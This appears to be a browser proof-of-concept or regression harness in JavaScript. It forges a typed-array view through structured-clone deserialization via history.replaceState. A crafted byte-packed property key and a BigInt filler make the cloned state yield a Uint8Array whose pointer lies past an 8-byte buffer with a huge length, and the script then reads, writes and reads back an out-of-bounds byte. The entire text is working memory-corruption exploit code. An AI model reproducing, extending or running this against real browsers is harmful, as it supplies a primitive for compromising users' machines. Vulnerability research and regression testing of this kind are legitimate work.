// One-byte write and readback at the first index of the forged wrapped view.
// Its raw pointer is one byte beyond the 8-byte backing buffer.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function runCase(id, useBigInt) {
  var phase = "build";
  var result;
  try {
    var backing = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(backing).fill(0x41);
    var filler = new Array(253);
    filler[0] = useBigInt ? BigInt(1) << BigInt(40) : 0;
    filler[1] = backing;
    for (var i = 2; i < filler.length; i++) filler[i] = {};
    var shared = { marker: 0x51515151 };
    var key = makeKey();
    var input = {};
    input.filler = filler;
    input.first = shared;
    input.second = shared;
    input[key] = 0;
    if (useBigInt && api && typeof api.markSync === "function") api.markSync("small_wrap_ready");
    phase = "store";
    history.replaceState(input, "");
    if (useBigInt && api && typeof api.markSync === "function") api.markSync("small_wrap_stored");
    phase = "load";
    var output = history.state;
    if (useBigInt && api && typeof api.markSync === "function") api.markSync("small_wrap_loaded");
    phase = "inspect";
    var target = output.filler[1];
    var synthetic = output["\u0000"];
    var isView = synthetic instanceof Uint8Array;
    var offset = isView ? synthetic.byteOffset : null;
    var length = isView ? synthetic.length : null;
    var byteLength = isView ? synthetic.byteLength : null;
    var before = null;
    var writeValue = null;
    var after = null;
    if (useBigInt && isView && offset === 8 && length > 1e12) {
      if (api && typeof api.markSync === "function") api.markSync("small_wrap_before_read");
      phase = "read_extra_byte";
      before = synthetic[0];
      if (api && typeof api.markSync === "function") api.markSync("small_wrap_after_read");
      if (typeof before === "number") {
        writeValue = (before ^ 0xa5) & 0xff;
        if (api && typeof api.markSync === "function") api.markSync("small_wrap_before_write");
        phase = "write_extra_byte";
        synthetic[0] = writeValue;
        if (api && typeof api.markSync === "function") api.markSync("small_wrap_after_write");
        phase = "readback_extra_byte";
        after = synthetic[0];
      }
      phase = "inspect";
    }
    var tailPreserved = Object.prototype.hasOwnProperty.call(output, key) && output[key] === 0;
    var expected = useBigInt ? isView && synthetic.buffer === target &&
      offset === 8 && length > 1e12 && byteLength > 1e12 &&
      typeof before === "number" && after === writeValue && after !== before &&
      new Uint8Array(target)[8] === undefined && !tailPreserved :
      output.first === output.second && tailPreserved && target.byteLength === 8;
    result = { id: id, status: expected ? "pass" : "fail", details: {
      synthetic_buffer_is_target: isView ? synthetic.buffer === target : false,
      synthetic_byte_offset: offset,
      synthetic_byte_length: byteLength,
      extra_before: typeof before === "number" ? before : null,
      extra_written: writeValue,
      extra_after: typeof after === "number" ? after : null,
      normal_extra_undefined: new Uint8Array(target)[8] === undefined,
      backing_length: target.byteLength,
      first_canary: new Uint8Array(target)[0],
      last_canary: new Uint8Array(target)[7],
      tail_preserved: tailPreserved
    } };
  } catch (error) {
    result = { id: id, status: "error", details: {
      phase: phase, error: String(error).slice(0, 200)
    } };
  }
  try { history.replaceState(null, ""); result.details.cleanup_ok = true; }
  catch (error) { result.status = "error"; result.details.cleanup_ok = false; }
  return result;
}
var control = runCase("small_wrap_write_no_bigint_control", false);
if (control.status !== "pass")
  return [control, { id: "small_wrap_write_bigint_case", status: "unsupported", details: { reason: "control_failed" } }];
return [control, runCase("small_wrap_write_bigint_case", true)];
